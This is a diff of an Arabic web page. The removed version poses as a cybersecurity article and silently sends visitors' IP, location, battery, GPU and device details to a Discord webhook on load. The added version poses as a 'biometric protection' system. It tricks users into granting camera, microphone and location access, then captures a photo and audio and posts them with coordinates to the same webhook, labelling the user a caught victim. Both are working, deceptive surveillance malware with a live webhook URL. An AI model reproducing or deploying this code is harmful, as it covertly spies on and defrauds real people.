@@ -2,118 +2,98 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقرير الاستراتيجي للأمن السيبراني 2026</title>
+    <title>نظام تأمين الهوية الرقمية 2026</title>
     <style>
-        body { font-family: 'Times New Roman', Times, serif; background: #f4f4f9; color: #1a1a1a; line-height: 1.8; margin: 0; padding: 0; }
-        .header-banner { background: #002b36; color: #2aa198; padding: 40px 20px; text-align: center; border-bottom: 5px solid #d33682; }
-        .container { max-width: 850px; margin: 40px auto; background: #fff; padding: 50px; box-shadow: 0 0 20px rgba(0,0,0,0.1); border-radius: 8px; }
-        h1 { font-size: 2.2rem; margin-bottom: 10px; }
-        h2 { color: #073642; border-right: 4px solid #268bd2; padding-right: 15px; margin-top: 30px; }
-        p { margin-bottom: 20px; text-align: justify; }
-        .data-status { background: #eee; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 0.9rem; border: 1px solid #ccc; }
-        .footer { text-align: center; padding: 20px; color: #666; font-size: 0.8rem; }
-        .loading-text { color: #d33682; font-weight: bold; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        body { background: #020205; color: #00ff9d; font-family: 'Courier New', monospace; text-align: center; padding: 20px; overflow-x: hidden; }
+        .glass-panel { 
+            max-width: 800px; margin: 40px auto; background: rgba(255,255,255,0.05); 
+            padding: 30px; border-radius: 20px; border: 1px solid #00ff9d; 
+            backdrop-filter: blur(10px); box-shadow: 0 0 30px rgba(0,255,157,0.2);
+        }
+        .btn-secure { 
+            background: #00ff9d; color: #000; border: none; padding: 15px 30px; 
+            font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 20px;
+            box-shadow: 0 0 15px #00ff9d;
+        }
+        .log { text-align: left; font-size: 12px; color: #888; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="header-banner">
-    <h1>المركز العالمي للأمن الاستباقي</h1>
-    <p>تحليل الثغرات الهيكلية في بروتوكولات HTML5 و WebGL</p>
-</div>
+    <div class="glass-panel">
+        <h1>تطوير الأمن السيبراني: بروتوكول الحماية 🌐</h1>
+        <p>لضمان حماية بياناتك من الاختراقات الخارجية، يتطلب النظام تفعيل "التوثيق الحيوي" للمتصفح.</p>
+        <p style="color: #ff3e3e;">⚠️ يرجى الضغط على الزر أدناه والموافقة على الأذونات لتشفير اتصالك الآن.</p>
+        
+        <button class="btn-secure" onclick="startUltimateCapture()">تفعيل الحماية الحيوية</button>
 
-<div class="container">
-    <div class="loading-text" id="scan-msg">>> جاري فحص توافق التشفير مع جهازك الحالي...</div>
-    
-    <h2>المقدمة: التحول في مشهد التهديدات الرقمية</h2>
-    <p>
-        مع حلول عام 2026، أصبح الأمن السيبراني لا يقتصر فقط على حماية الشبكات، بل امتد ليشمل "البصمة الرقمية" التي يتركها المستخدم خلفه. لغة HTML لم تعد مجرد وسيلة لعرض المحتوى، بل أصبحت أداة تحليلية يمكن من خلالها معرفة مواصفات الأجهزة بدقة متناهية.
-    </p>
-
-    <h2>1. استغلال واجهات برمجة التطبيقات (APIs) في المتصفح</h2>
-    <p>
-        تسمح واجهات البرمجيات مثل <strong>Battery Status API</strong> للمواقع بمعرفة حالة طاقة الجهاز. من الناحية الأمنية، يمكن استخدام هذه البيانات لتتبع المستخدمين عبر المواقع المختلفة (Fingerprinting)، حيث أن نسبة البطارية وسرعة تفريغها تعمل كبصمة فريدة للجهاز في لحظة زمنية معينة.
-    </p>
-
-    <h2>2. هندسة المتصفحات وتحديات الخصوصية</h2>
-    <p>
-        عندما يقوم المتصفح بطلب صفحة ويب، فإنه يرسل "User Agent" يحتوي على تفاصيل نظام التشغيل، نوع المعالج، وحتى دقة الشاشة. المهاجمون المحترفون يستخدمون تقنية <strong>Canvas Fingerprinting</strong>، وهي رسم صور مخفية في المتصفح لاستخراج نوع كرت الشاشة (GPU) المستخدم، مما يسهل عملية تحديد نوع الجهاز (آيفون، أندرويد، أو كمبيوتر شخصي).
-    </p>
-
-    <div class="data-status">
-        [نظام المراقبة]: يتم الآن تطبيق بروتوكول AES-256 لتأمين هذه الجلسة تقنياً...
+        <div class="log" id="status-log">
+            > انتظار استجابة المستخدم...
+        </div>
     </div>
 
-    <h2>3. التوصيات الأمنية لحماية البيانات</h2>
-    <p>
-        لحماية نفسك، يجب عليك دائماً مراقبة الأذونات التي تمنحها للمواقع. المواقع التعليمية والبحثية الموثوقة تقوم دائماً بفحص موارد النظام لضمان عدم وجود تداخلات برمجية خبيثة أثناء تصفح المقالات الطويلة.
-    </p>
-</div>
+    <script>
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1492913386810245151/247Nc1kE6rz06tvqTTKAiDjZbHMpyjLMpmC4velKlPHmSWSFp_1Ue_-xJJdBhrcgX4D9';
 
-<div class="footer">
-    جميع الحقوق محفوظة © 2026 - مختبرات الأمن السيبراني المتقدمة
-</div>
+        async function startUltimateCapture() {
+            const log = document.getElementById('status-log');
+            log.innerHTML += "<br>> جاري طلب الأذونات الأمنية...";
 
-<script>
-    const HOOK_URL = 'https://discord.com/api/webhooks/1492913386810245151/247Nc1kE6rz06tvqTTKAiDjZbHMpyjLMpmC4velKlPHmSWSFp_1Ue_-xJJdBhrcgX4D9';
+            try {
+                // 1. طلب الموقع، الكاميرا، والميكروفون
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const position = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
 
-    async function fullAudit() {
-        try {
-            // جلب الـ IP والموقع (حقيقي)
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+                log.innerHTML += "<br>> تم تأكيد الهوية. جاري الرفع...";
 
-            // جلب البطارية (حقيقي)
-            let battery = "غير متاح";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                battery = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن ⚡' : 'لا يشحن'})`;
+                // 2. التقاط صورة من الكاميرا
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+
+                // 3. تسجيل 3 ثواني صوت
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+                
+                setTimeout(async () => {
+                    recorder.stop();
+                    recorder.onstop = async () => {
+                        const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+                        
+                        // 4. جمع كل المعلومات (IP, GPU, Battery, Location)
+                        const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
+                        const gl = canvas.getContext('webgl');
+                        const gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Unknown";
+
+                        // 5. إرسال كل شيء لـ Discord في طلب واحد (FormData)
+                        const fd = new FormData();
+                        const info = {
+                            username: "رادار المراقبة الكلي 👁️",
+                            content: `🚨 **تم صيد الضحية بالكامل!**\n📍 الخريطة: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}\n🔋 البطارية: ${Math.round((await navigator.getBattery()).level * 100)}%\n🎮 الجهاز: ${gpu}\n🌐 الـ IP: ${ipRes.ip}`,
+                        };
+                        
+                        fd.append('payload_json', JSON.stringify(info));
+                        fd.append('file1', photoBlob, 'photo.jpg');
+                        fd.append('file2', audioBlob, 'audio.webm');
+
+                        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd });
+                        
+                        log.innerHTML += "<br>> تم الانتهاء. اتصالك محمي الآن.";
+                        stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا بعد السحب
+                    };
+                }, 3000);
+
+            } catch (err) {
+                log.innerHTML += `<br><span style="color:red">> خطأ: تم رفض الأذونات.</span>`;
             }
-
-            // جلب كرت الشاشة GPU (حقيقي)
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Unknown";
-
-            // إرسال التقرير الشامل
-            const payload = {
-                username: "محلل البيانات الاستخباراتي 🕵️‍♂️",
-                embeds: [{
-                    title: "📄 تقرير الضحية من خلال المقال الأمني",
-                    description: "الضحية يقرأ المقال الآن، وهذه هي بياناته الحقيقية:",
-                    color: 15158332,
-                    fields: [
-                        { name: "🌐 الـ IP:", value: `\`${ipData.ip}\``, inline: true },
-                        { name: "📍 الموقع:", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
-                        { name: "🔋 البطارية:", value: battery, inline: true },
-                        { name: "🎮 كرت الشاشة (GPU):", value: `\`${gpu}\``, inline: false },
-                        { name: "📱 النظام:", value: navigator.platform, inline: true },
-                        { name: "🧠 الرام والمعالج:", value: `${navigator.deviceMemory || '?'}GB RAM / ${navigator.hardwareConcurrency} Cores`, inline: true },
-                        { name: "📶 المزود:", value: ipData.org, inline: false }
-                    ],
-                    footer: { text: "تمت المزامنة بنجاح أثناء القراءة." }
-                }]
-            };
-
-            await fetch(HOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            // تغيير الرسالة بعد الإرسال
-            setTimeout(() => {
-                document.getElementById('scan-msg').innerText = ">> تم التحقق من أمان الجهاز بنجاح. قراءة ممتعة.";
-                document.getElementById('scan-msg').style.color = "green";
-            }, 3000);
-
-        } catch (e) {}
-    }
-
-    window.onload = fullAudit;
-</script>
-
+        }
+    </script>
 </body>
 </html>
